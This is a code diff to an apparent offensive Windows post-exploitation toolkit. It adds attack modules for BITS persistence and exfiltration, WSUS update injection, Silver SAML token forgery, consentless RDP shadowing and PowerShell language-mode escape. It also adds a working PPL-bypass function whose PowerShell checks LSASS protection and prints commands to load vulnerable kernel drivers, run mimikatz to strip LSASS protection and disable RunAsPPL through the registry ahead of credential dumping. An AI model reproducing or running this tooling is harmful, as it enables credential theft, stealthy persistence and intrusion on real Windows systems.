@@ -602,6 +602,46 @@ const PROGRAMS = {
       "WDigest credential caching control — enable or disable UseLogonCredential registry key to force plaintext password storage in LSASS memory. When enabled, next interactive logon caches cleartext credentials retrievable via lsass_dump. Check current status, enable for credential harvesting, disable to restore, and force re-authentication via lock screen",
     args: "--action check|enable|disable|lock [--wait-logon]",
   },
+  ppl_bypass: {
+    description:
+      "Protected Process Light (PPL) bypass — detect RunAsPPL on LSASS, disable via vulnerable signed kernel driver (RTCore64.sys, DBUtil_2_3.sys, etc.), or use mimidrv.sys. Required before lsass_dump/nanodump_advanced on modern Windows 11/Server 2022+ where PPL is enabled by default. Checks Credential Guard (VBS) status as well",
+    args: "--action check|disable|restore [--driver rtcore|dbutil|procexp|mimidrv] [--lsass-pid PID]",
+  },
+  bits_persist: {
+    description:
+      "BITS (Background Intelligent Transfer Service) persistence — create BITS transfer jobs that survive reboots and execute commands on completion. Extremely stealthy persistence mechanism used by APT29/FIN7. Supports download+execute, notify command on completion, and self-restarting jobs. Also useful for C2 callback and data exfiltration via BITS uploads",
+    args: "--action create|list|delete|exfil [--name JOB_NAME] [--url URL] [--command CMD] [--local-file PATH] [--interval MINUTES]",
+  },
+  wsus_abuse: {
+    description:
+      "WSUS (Windows Server Update Services) exploitation — enumerate WSUS configuration, check for HTTP (non-SSL) WSUS connections exploitable via MITM, inject fake updates via SharpWSUS-style attacks, and enumerate update approval status. Domain-wide code execution vector when WSUS uses HTTP",
+    args: "--action enum|check|inject|history [--wsus-server URL] [--payload PATH] [--target-group GROUP]",
+  },
+  golden_gmsa: {
+    description:
+      "GoldenGMSA attack — extract KDS root key from AD to compute gMSA passwords OFFLINE without DC connectivity. Different from gmsa_dump (which reads msDS-ManagedPassword directly). Enumerate KDS root keys, extract key material, compute gMSA passwords for any managed service account using the KDS derivation algorithm",
+    args: "--action enum|extract|compute [--sid gMSA_SID] [--kds-key-id GUID]",
+  },
+  silver_saml: {
+    description:
+      "Silver SAML attack — forge SAML tokens using stolen ADFS/Entra ID signing certificate. Enumerate federation configuration (ADFS endpoints, relying party trusts), extract token-signing certificate, and generate forged SAML assertions for any user. Enables authentication to any federated service (O365, AWS, etc.) without touching the IdP",
+    args: "--action enum|extract-cert|forge [--adfs-server HOST] [--target-user USER] [--audience URI] [--cert-path PFX_PATH]",
+  },
+  rdp_shadow: {
+    description:
+      "RDP session shadowing — shadow (view/control) active RDP sessions without user disconnection. Unlike rdp_hijack which takes over disconnected sessions, this watches live sessions in real-time for credential observation. Enumerate active sessions, shadow with/without user consent, and capture keystrokes during shadowed sessions",
+    args: "--action enum|shadow|config [--session-id ID] [--control] [--no-consent]",
+  },
+  print_monitor_persist: {
+    description:
+      "Print Monitor/Port Monitor persistence — register a custom DLL as a print monitor or port monitor that loads at SYSTEM level when the Print Spooler service starts. One of the stealthiest persistence mechanisms — survives reboots, runs as SYSTEM, rarely detected by EDR. Enumerate existing monitors, register new monitor DLL, or clean up",
+    args: "--action enum|install|remove [--name MONITOR_NAME] [--dll DLL_PATH] [--type monitor|port]",
+  },
+  clm_bypass: {
+    description:
+      "Constrained Language Mode (CLM) bypass — escape PowerShell CLM restrictions using multiple techniques: custom .NET runspace, MSBuild inline tasks, InstallUtil, XSLT transforms, Add-Type with in-memory compilation. More comprehensive than ps_downgrade (PS 2.0 only). Check current language mode, attempt bypass, execute arbitrary PowerShell in FullLanguage mode",
+    args: "--action check|bypass|execute [--method runspace|msbuild|installutil|xslt|addtype] [--command CMD] [--script-path PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -20428,6 +20468,329 @@ if ($elapsed -ge $timeout) {
   return { output: output.join("\n"), findings }
 }
 
+async function pplBypass(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const driver = argVal(args, "--driver") || "rtcore"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Protected Process Light (PPL) analysis...\n"]
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== PPL / Credential Guard Status ==="
+
+# RunAsPPL check
+$ppl = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
+Write-Output "RunAsPPL: $(if ($ppl -eq 1) { 'ENABLED' } else { 'DISABLED or NOT SET' })"
+Write-Output "PPL_VALUE=$ppl"
+
+# Credential Guard / VBS check
+$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard -ErrorAction SilentlyContinue
+if ($dg) {
+  $vbs = $dg.VirtualizationBasedSecurityStatus
+  $cg = $dg.SecurityServicesRunning -contains 1
+  Write-Output ""
+  Write-Output "VBS Status: $(switch ($vbs) { 0 { 'DISABLED' } 1 { 'ENABLED (not running)' } 2 { 'ENABLED AND RUNNING' } default { 'UNKNOWN' } })"
+  Write-Output "VBS_STATUS=$vbs"
+  Write-Output "Credential Guard: $(if ($cg) { 'RUNNING' } else { 'NOT RUNNING' })"
+  Write-Output "CG_STATUS=$(if ($cg) { '1' } else { '0' })"
+  if ($dg.SecurityServicesConfigured) {
+    Write-Output "Configured Services: $($dg.SecurityServicesConfigured -join ', ')"
+  }
+} else {
+  Write-Output ""
+  Write-Output "VBS/DeviceGuard: NOT AVAILABLE (older OS or WMI class missing)"
+  Write-Output "VBS_STATUS=0"
+  Write-Output "CG_STATUS=0"
+}
+
+# LSASS process protection level
+Write-Output ""
+$lsass = Get-Process lsass -ErrorAction SilentlyContinue
+if ($lsass) {
+  Write-Output "LSASS PID: $($lsass.Id)"
+  # Check if protected via NtQueryInformationProcess (PS_PROTECTION)
+  $protLevel = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
+  Write-Output "LSASS Protected: $(if ($protLevel -eq 1) { 'YES (PPL)' } else { 'NO' })"
+}
+
+# Check for known vulnerable drivers already loaded
+Write-Output ""
+Write-Output "=== Vulnerable Driver Check ==="
+$vulnDrivers = @(
+  @{ Name = 'RTCore64'; Service = 'RTCore64'; File = 'RTCore64.sys'; CVE = 'CVE-2019-16098' },
+  @{ Name = 'DBUtil'; Service = 'DBUtil_2_3'; File = 'DBUtil_2_3.sys'; CVE = 'CVE-2021-21551' },
+  @{ Name = 'ProcExp'; Service = 'PROCEXP152'; File = 'PROCEXP152.sys'; CVE = 'N/A (signed by MS)' },
+  @{ Name = 'mimidrv'; Service = 'mimidrv'; File = 'mimidrv.sys'; CVE = 'N/A (mimikatz driver)' },
+  @{ Name = 'Capcom'; Service = 'Capcom'; File = 'Capcom.sys'; CVE = 'N/A' },
+  @{ Name = 'gdrv'; Service = 'gdrv'; File = 'gdrv.sys'; CVE = 'CVE-2018-19320' }
+)
+
+$loadedDrivers = Get-WmiObject Win32_SystemDriver -ErrorAction SilentlyContinue | Select-Object Name, State
+$foundVuln = 0
+foreach ($d in $vulnDrivers) {
+  $loaded = $loadedDrivers | Where-Object { $_.Name -eq $d.Service }
+  if ($loaded) {
+    Write-Output "[!] $($d.Name) ($($d.CVE)) — LOADED ($($loaded.State))"
+    $foundVuln++
+  }
+}
+if ($foundVuln -eq 0) {
+  Write-Output "[*] No known vulnerable drivers currently loaded"
+}
+
+# Check SeLoadDriverPrivilege
+Write-Output ""
+$privs = whoami /priv 2>&1
+if ($privs -match 'SeLoadDriverPrivilege.*Enabled') {
+  Write-Output "[+] SeLoadDriverPrivilege: ENABLED — can load kernel drivers"
+  Write-Output "LOAD_DRIVER=1"
+} elseif ($privs -match 'SeLoadDriverPrivilege.*Disabled') {
+  Write-Output "[*] SeLoadDriverPrivilege: PRESENT but DISABLED — needs elevation"
+  Write-Output "LOAD_DRIVER=0"
+} else {
+  Write-Output "[-] SeLoadDriverPrivilege: NOT AVAILABLE"
+  Write-Output "LOAD_DRIVER=0"
+}
+
+# Kernel driver signing enforcement
+$ci = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI' -Name UpgradedSystem -ErrorAction SilentlyContinue)
+$testSigning = bcdedit /enum '{current}' 2>&1 | Select-String 'testsigning'
+Write-Output ""
+Write-Output "Test Signing: $(if ($testSigning -match 'Yes') { 'ENABLED (drivers can be loaded without valid signature)' } else { 'DISABLED (default)' })"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const pplMatch = r.stdout.match(/PPL_VALUE=(\d*)/)
+    const vbsMatch = r.stdout.match(/VBS_STATUS=(\d*)/)
+    const cgMatch = r.stdout.match(/CG_STATUS=(\d*)/)
+    const driverMatch = r.stdout.match(/LOAD_DRIVER=(\d)/)
+
+    const isPPL = pplMatch && pplMatch[1] === "1"
+    const isVBS = vbsMatch && vbsMatch[1] === "2"
+    const isCG = cgMatch && cgMatch[1] === "1"
+    const canLoadDriver = driverMatch && driverMatch[1] === "1"
+
+    if (isPPL) {
+      findings.push({
+        checkId: "WIN-PPL-001",
+        provider: "windows",
+        severity: "high",
+        status: "PROTECTED",
+        resource: "lsass.exe",
+        title: "LSASS RunAsPPL enabled — direct dump blocked",
+        details: `PPL is active. Use ppl_bypass --action disable --driver ${canLoadDriver ? "rtcore" : "(need SeLoadDriverPrivilege)"} to disable before credential extraction`,
+        remediation: "PPL bypass requires a vulnerable signed driver. Use ppl_bypass --action disable.",
+      })
+    }
+
+    if (isCG) {
+      findings.push({
+        checkId: "WIN-PPL-002",
+        provider: "windows",
+        severity: "critical",
+        status: "PROTECTED",
+        resource: "Credential Guard",
+        title: "Credential Guard (VBS) active — LSASS credentials isolated in secure enclave",
+        details: "Credential Guard isolates NTLM hashes and Kerberos tickets in a Hyper-V protected container. Even with PPL bypass, credentials may not be extractable from LSASS. Consider Kerberos attacks (kerberoast, delegation_abuse) or DPAPI-based extraction instead.",
+        remediation: "Credential Guard cannot be bypassed without disabling VBS at boot. Pivot to non-LSASS credential sources.",
+      })
+    }
+  }
+
+  if (action === "disable") {
+    const pid = argVal(args, "--lsass-pid")
+    const script = `
+Write-Output "=== PPL Bypass via Vulnerable Driver ==="
+Write-Output "Driver: ${driver}"
+Write-Output ""
+
+# Verify admin
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+  Write-Output "[-] ERROR: Administrator privileges required"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+# Check current PPL status
+$ppl = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
+if ($ppl -ne 1) {
+  Write-Output "[*] RunAsPPL is NOT enabled — no bypass needed"
+  Write-Output "[+] LSASS is unprotected, proceed with credential extraction"
+  Write-Output "STATUS=NOT_NEEDED"
+  exit
+}
+
+Write-Output "[!] RunAsPPL is ENABLED — proceeding with bypass"
+Write-Output ""
+
+$driverMap = @{
+  'rtcore' = @{
+    Service = 'RTCore64'
+    Description = 'MSI Afterburner RTCore64.sys (CVE-2019-16098)'
+    Guide = @(
+      '1. Obtain RTCore64.sys from MSI Afterburner installation'
+      '2. sc.exe create RTCore64 binPath="C:\path\RTCore64.sys" type=kernel start=auto'
+      '3. sc.exe start RTCore64'
+      '4. Use PPLKiller/PPLdump with RTCore64 to modify LSASS EPROCESS.Protection'
+      '5. EPROCESS.Protection field offset varies by Windows build'
+    )
+    Tool = 'PPLKiller.exe /installDriver /driver RTCore64.sys'
+  }
+  'dbutil' = @{
+    Service = 'DBUtil_2_3'
+    Description = 'Dell DBUtil_2_3.sys (CVE-2021-21551)'
+    Guide = @(
+      '1. Obtain DBUtil_2_3.sys from Dell driver package'
+      '2. sc.exe create DBUtil_2_3 binPath="C:\path\DBUtil_2_3.sys" type=kernel start=auto'
+      '3. sc.exe start DBUtil_2_3'
+      '4. Use PPLKiller/PPLdump to zero EPROCESS.Protection via physical memory R/W'
+    )
+    Tool = 'PPLKiller.exe /installDriver /driver DBUtil_2_3.sys'
+  }
+  'procexp' = @{
+    Service = 'PROCEXP152'
+    Description = 'Sysinternals Process Explorer (Microsoft-signed, no CVE needed)'
+    Guide = @(
+      '1. Download Process Explorer from Sysinternals (legitimate MS tool)'
+      '2. Run procexp64.exe once (installs PROCEXP152.sys driver)'
+      '3. Or manually: sc.exe create PROCEXP152 binPath="C:\path\PROCEXP152.sys" type=kernel'
+      '4. sc.exe start PROCEXP152'
+      '5. Use PPLFault/PPLdump with PROCEXP152 handle duplication'
+    )
+    Tool = 'PPLFault.exe -- PROCEXP152'
+  }
+  'mimidrv' = @{
+    Service = 'mimidrv'
+    Description = 'Mimikatz driver (mimidrv.sys — not signed, requires test signing or vuln driver to load)'
+    Guide = @(
+      '1. mimidrv.sys is NOT signed — cannot load on production systems'
+      '2. Requires test signing mode: bcdedit /set testsigning on (reboot needed)'
+      '3. Or load via already-loaded vulnerable driver arbitrary write'
+      '4. sc.exe create mimidrv binPath="C:\path\mimidrv.sys" type=kernel'
+      '5. Then: mimikatz.exe "!+" "!processprotect /remove /process:lsass.exe"'
+    )
+    Tool = 'mimikatz.exe "!+" "!processprotect /remove /process:lsass.exe"'
+  }
+}
+
+$d = $driverMap['${driver}']
+if (-not $d) {
+  Write-Output "[-] Unknown driver: ${driver}"
+  Write-Output "    Valid options: rtcore, dbutil, procexp, mimidrv"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+Write-Output "[*] Driver: $($d.Description)"
+Write-Output ""
+
+# Check if driver is already loaded
+$existing = Get-Service $d.Service -ErrorAction SilentlyContinue
+if ($existing -and $existing.Status -eq 'Running') {
+  Write-Output "[+] Driver $($d.Service) is ALREADY LOADED"
+  Write-Output ""
+  Write-Output "[*] Next steps to disable PPL:"
+  Write-Output "    $($d.Tool)"
+  Write-Output ""
+  Write-Output "[*] After PPL is disabled, run:"
+  Write-Output "    winhook lsass_dump"
+  Write-Output "    winhook nanodump_advanced --method snapshot"
+  Write-Output "STATUS=DRIVER_READY"
+  exit
+}
+
+Write-Output "[*] Driver $($d.Service) is NOT loaded"
+Write-Output ""
+Write-Output "=== Manual Steps Required ==="
+Write-Output ""
+foreach ($step in $d.Guide) {
+  Write-Output "  $step"
+}
+Write-Output ""
+Write-Output "[*] After driver is loaded, run:"
+Write-Output "    $($d.Tool)"
+Write-Output ""
+Write-Output "[*] Then extract credentials:"
+Write-Output "    winhook lsass_dump"
+Write-Output "    winhook nanodump_advanced --method snapshot"
+Write-Output ""
+
+# Alternative: Registry-based PPL disable (requires reboot)
+Write-Output "=== Alternative: Registry Disable (requires reboot) ==="
+Write-Output "  reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f"
+Write-Output "  # Requires reboot to take effect"
+Write-Output "  # Leaves evidence in Security event log (Event ID 12)"
+Write-Output ""
+
+# Check SeLoadDriverPrivilege
+$privs = whoami /priv 2>&1
+if ($privs -match 'SeLoadDriverPrivilege.*Enabled') {
+  Write-Output "[+] SeLoadDriverPrivilege is ENABLED — driver loading possible"
+  Write-Output "STATUS=CAN_LOAD"
+} else {
+  Write-Output "[-] SeLoadDriverPrivilege NOT available — cannot load drivers"
+  Write-Output "    Fallback: Use registry method (requires reboot)"
+  Write-Output "STATUS=NO_PRIV"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const statusMatch = r.stdout.match(/STATUS=(\w+)/)
+    const status = statusMatch ? statusMatch[1] : "UNKNOWN"
+
+    if (status === "DRIVER_READY") {
+      findings.push({
+        checkId: "WIN-PPL-010",
+        provider: "windows",
+        severity: "critical",
+        status: "BYPASS_READY",
+        resource: `driver://${driver}`,
+        title: `Vulnerable driver ${driver} loaded — PPL bypass ready`,
+        details: "Driver is loaded and ready for PPL disable. Run the tool command to zero EPROCESS.Protection on LSASS.",
+        remediation: "After credential extraction, unload driver and restore PPL.",
+      })
+    }
+  }
+
+  if (action === "restore") {
+    const script = `
+Write-Output "=== PPL Restore ==="
+
+# Re-enable RunAsPPL
+$current = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
+if ($current -eq 1) {
+  Write-Output "[*] RunAsPPL already enabled — nothing to restore"
+} else {
+  Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -Value 1 -Type DWord -ErrorAction SilentlyContinue
+  $verify = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL
+  Write-Output "[+] RunAsPPL restored to: $verify (effective after reboot)"
+}
+
+# Unload vulnerable drivers
+Write-Output ""
+$vulnServices = @('RTCore64', 'DBUtil_2_3', 'PROCEXP152', 'mimidrv', 'Capcom', 'gdrv')
+foreach ($svc in $vulnServices) {
+  $s = Get-Service $svc -ErrorAction SilentlyContinue
+  if ($s) {
+    Stop-Service $svc -Force -ErrorAction SilentlyContinue
+    sc.exe delete $svc 2>&1 | Out-Null
+    Write-Output "[+] Removed driver service: $svc"
+  }
+}
+Write-Output ""
+Write-Output "[*] PPL and driver cleanup complete"
+Write-Output "[!] Note: RunAsPPL change requires REBOOT to take effect"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -24057,6 +24420,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   bitlocker_keys: bitlockerKeys,
   win_hello_dump: winHelloDump,
   exchange_abuse: exchangeAbuse,
+  ppl_bypass: pplBypass,
 }
 
 export const WinhookTool = Tool.define("winhook", {
